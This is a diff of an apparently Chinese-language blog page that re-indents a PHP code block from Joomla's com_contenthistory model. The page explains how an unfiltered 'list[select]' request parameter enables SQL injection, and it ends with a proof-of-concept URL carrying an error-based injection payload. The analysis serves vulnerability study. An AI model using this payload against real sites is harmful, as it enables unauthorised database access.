@@ -1018,70 +1018,70 @@
 </span></span><span class="line"><span class="cl">		<span class="p">}</span>
 </span></span><span class="line"><span class="cl">	<span class="p">}</span>
 </span></span></code></pre></div><p>在这一部分代码中：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="nv">$list</span> <span class="o">=</span> <span class="nv">$app</span><span class="o">-&gt;</span><span class="na">getUserStateFromRequest</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">context</span> <span class="o">.</span> <span class="s1">&#39;.list&#39;</span><span class="p">,</span> <span class="s1">&#39;list&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(),</span> <span class="s1">&#39;array&#39;</span><span class="p">))</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$list</span> <span class="o">=</span> <span class="nv">$app</span><span class="o">-&gt;</span><span class="na">getUserStateFromRequest</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">context</span> <span class="o">.</span> <span class="s1">&#39;.list&#39;</span><span class="p">,</span> <span class="s1">&#39;list&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(),</span> <span class="s1">&#39;array&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">foreach</span> <span class="p">(</span><span class="nv">$list</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">// Extra validations
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="k">switch</span> <span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">			<span class="p">{</span>
-</span></span><span class="line"><span class="cl">				<span class="k">foreach</span> <span class="p">(</span><span class="nv">$list</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">				<span class="p">{</span>
-</span></span><span class="line"><span class="cl">					<span class="c1">// Extra validations
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					<span class="k">switch</span> <span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="k">case</span> <span class="s1">&#39;fullordering&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">					<span class="nv">$orderingParts</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">					<span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">					<span class="p">{</span>
-</span></span><span class="line"><span class="cl">						<span class="k">case</span> <span class="s1">&#39;fullordering&#39;</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">							<span class="nv">$orderingParts</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">						<span class="c1">// Latest part will be considered the direction
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>						<span class="nv">$fullDirection</span> <span class="o">=</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">							<span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">							<span class="p">{</span>
-</span></span><span class="line"><span class="cl">								<span class="c1">// Latest part will be considered the direction
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>								<span class="nv">$fullDirection</span> <span class="o">=</span> <span class="nx">end</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">						<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">strtoupper</span><span class="p">(</span><span class="nv">$fullDirection</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;ASC&#39;</span><span class="p">,</span> <span class="s1">&#39;DESC&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">						<span class="p">{</span>
+</span></span><span class="line"><span class="cl">							<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.direction&#39;</span><span class="p">,</span> <span class="nv">$fullDirection</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">						<span class="p">}</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">								<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">strtoupper</span><span class="p">(</span><span class="nv">$fullDirection</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;ASC&#39;</span><span class="p">,</span> <span class="s1">&#39;DESC&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)))</span>
-</span></span><span class="line"><span class="cl">								<span class="p">{</span>
-</span></span><span class="line"><span class="cl">									<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.direction&#39;</span><span class="p">,</span> <span class="nv">$fullDirection</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">								<span class="p">}</span>
+</span></span><span class="line"><span class="cl">						<span class="nx">unset</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">[</span><span class="nx">count</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">								<span class="nx">unset</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">[</span><span class="nx">count</span><span class="p">(</span><span class="nv">$orderingParts</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">						<span class="c1">// The rest will be the ordering
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>						<span class="nv">$fullOrdering</span> <span class="o">=</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$orderingParts</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">								<span class="c1">// The rest will be the ordering
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>								<span class="nv">$fullOrdering</span> <span class="o">=</span> <span class="nx">implode</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nv">$orderingParts</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">								<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$fullOrdering</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter_fields</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">								<span class="p">{</span>
-</span></span><span class="line"><span class="cl">									<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.ordering&#39;</span><span class="p">,</span> <span class="nv">$fullOrdering</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">								<span class="p">}</span>
-</span></span><span class="line"><span class="cl">							<span class="p">}</span>
-</span></span><span class="line"><span class="cl">							<span class="k">else</span>
-</span></span><span class="line"><span class="cl">							<span class="p">{</span>
-</span></span><span class="line"><span class="cl">								<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.ordering&#39;</span><span class="p">,</span> <span class="nv">$ordering</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">								<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.direction&#39;</span><span class="p">,</span> <span class="nv">$direction</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">							<span class="p">}</span>
-</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">						<span class="k">case</span> <span class="s1">&#39;ordering&#39;</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">							<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter_fields</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl">							<span class="p">{</span>
-</span></span><span class="line"><span class="cl">								<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$ordering</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">							<span class="p">}</span>
-</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">						<span class="k">case</span> <span class="s1">&#39;direction&#39;</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">							<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">strtoupper</span><span class="p">(</span><span class="nv">$value</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;ASC&#39;</span><span class="p">,</span> <span class="s1">&#39;DESC&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)))</span>
-</span></span><span class="line"><span class="cl">							<span class="p">{</span>
-</span></span><span class="line"><span class="cl">								<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$direction</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">							<span class="p">}</span>
-</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">						<span class="k">case</span> <span class="s1">&#39;limit&#39;</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">							<span class="nv">$limit</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">						<span class="c1">// Just to keep the default case
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>						<span class="k">default</span><span class="o">:</span>
-</span></span><span class="line"><span class="cl">							<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">							<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">						<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$fullOrdering</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter_fields</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">						<span class="p">{</span>
+</span></span><span class="line"><span class="cl">							<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.ordering&#39;</span><span class="p">,</span> <span class="nv">$fullOrdering</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">						<span class="p">}</span>
 </span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">					<span class="k">else</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.ordering&#39;</span><span class="p">,</span> <span class="nv">$ordering</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">						<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.direction&#39;</span><span class="p">,</span> <span class="nv">$direction</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">					<span class="k">break</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">					<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="k">case</span> <span class="s1">&#39;ordering&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">					<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filter_fields</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$ordering</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">					<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">				<span class="k">case</span> <span class="s1">&#39;direction&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">					<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nx">strtoupper</span><span class="p">(</span><span class="nv">$value</span><span class="p">),</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;ASC&#39;</span><span class="p">,</span> <span class="s1">&#39;DESC&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">					<span class="p">{</span>
+</span></span><span class="line"><span class="cl">						<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$direction</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="p">}</span>
+</span></span><span class="line"><span class="cl">					<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">				<span class="k">case</span> <span class="s1">&#39;limit&#39;</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">					<span class="nv">$limit</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">				<span class="c1">// Just to keep the default case
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>				<span class="k">default</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">					<span class="nv">$value</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="k">break</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">setState</span><span class="p">(</span><span class="s1">&#39;list.&#39;</span> <span class="o">.</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
 </span></span></code></pre></div><p>这里会从http请求中获取名为list的数组，可以看到最开始我们的参数&rsquo;list.select&rsquo;没有对应的处理逻辑，就会走default即不做任何处理，这导致了后续子类的populateState在对model的属性进行赋值的时候没有任何的过滤。所以我们可以控制$this-&gt;getState(‘list.select’)的返回值，构造SQL注入。</p>
 <p>POC：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/</span><span class="nx">index</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">option</span><span class="o">=</span><span class="nx">com_contenthistory</span><span class="o">&amp;</span><span class="nx">view</span><span class="o">=</span><span class="nx">history</span><span class="o">&amp;</span><span class="nx">item_id</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="k">list</span><span class="p">[</span><span class="nx">ordering</span><span class="p">]</span><span class="o">=&amp;</span><span class="nx">type_id</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="k">list</span><span class="p">[</span><span class="nx">select</span><span class="p">]</span><span class="o">=</span><span class="p">(</span><span class="nx">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="nx">select</span> <span class="o">*</span> <span class="nx">from</span><span class="p">(</span><span class="nx">select</span> <span class="nx">md5</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span><span class="nx">x</span><span class="p">)))</span>
